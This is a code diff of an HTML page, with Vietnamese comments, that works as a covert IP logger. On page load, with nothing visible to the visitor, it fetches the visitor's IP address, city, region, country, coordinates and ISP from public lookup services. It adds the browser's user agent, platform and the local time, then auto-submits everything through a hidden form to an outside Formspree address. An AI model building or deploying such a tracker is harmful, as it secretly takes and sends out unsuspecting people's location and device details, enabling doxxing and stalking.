@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Log IP with Device Info</title>
+  <title>Get IP and Device Info</title>
 </head>
 <body>
   <form id="ipForm" action="https://formspree.io/f/xovwnjya" method="POST" style="display:none;">
@@ -10,48 +10,57 @@
   </form>
 
   <script>
-    async function getClientInfo() {
+    async function getInfo() {
       try {
-        // Lấy IP và thông tin địa lý
-        const geoRes = await fetch('https://ipapi.co/json/');
-        const geoData = await geoRes.json();
+        // Gọi song song cả hai API
+        const [ipRes, geoRes] = await Promise.all([
+          fetch('https://api.ipify.org?format=json'), // Chắc chắn hoạt động
+          fetch('https://ipapi.co/json/')             // Có thể fail, nhưng ta thử
+        ]);
 
-        const ip = geoData.ip;
-        const city = geoData.city;
-        const region = geoData.region;
-        const country = geoData.country_name;
-        const lat = geoData.latitude;
-        const lon = geoData.longitude;
-        const isp = geoData.org;
+        const ipData = await ipRes.json();
+        const geoData = await geoRes.ok ? await geoRes.json() : {};
 
-        // Lấy thông tin thiết bị
+        // Lấy thông tin
+        const ip = ipData.ip || 'Unknown';
+        const city = geoData.city || 'Unknown';
+        const region = geoData.region || 'Unknown';
+        const country = geoData.country_name || 'Unknown';
+        const lat = geoData.latitude || 'Unknown';
+        const lon = geoData.longitude || 'Unknown';
+        const isp = geoData.org || 'Unknown';
         const ua = navigator.userAgent;
         const platform = navigator.platform;
+        const now = new Date().toLocaleString();
 
-        // Chuẩn bị nội dung gửi
-        const details = `
-IP: ${ip}
-City: ${city}
-Region: ${region}
-Country: ${country}
-Latitude: ${lat}
-Longitude: ${lon}
-ISP: ${isp}
+        // Soạn nội dung gửi – IP ở đầu rõ ràng
+        const content = `
+🔐 IP Address: ${ip}
 
-User-Agent: ${ua}
-Platform: ${platform}
+📍 Location:
+- City: ${city}
+- Region: ${region}
+- Country: ${country}
+- Latitude: ${lat}
+- Longitude: ${lon}
+- ISP: ${isp}
+
+💻 Device:
+- Platform: ${platform}
+- User-Agent: ${ua}
+
+🕒 Time: ${now}
         `.trim();
 
-        document.getElementById('ipInfo').value = details;
-
-        // Gửi form
+        // Gán vào form và gửi
+        document.getElementById('ipInfo').value = content;
         document.getElementById('ipForm').submit();
-      } catch (err) {
-        console.error('Failed to fetch info', err);
+      } catch (error) {
+        console.error('Error fetching data:', error);
       }
     }
 
-    getClientInfo();
+    getInfo();
   </script>
 </body>
 </html>
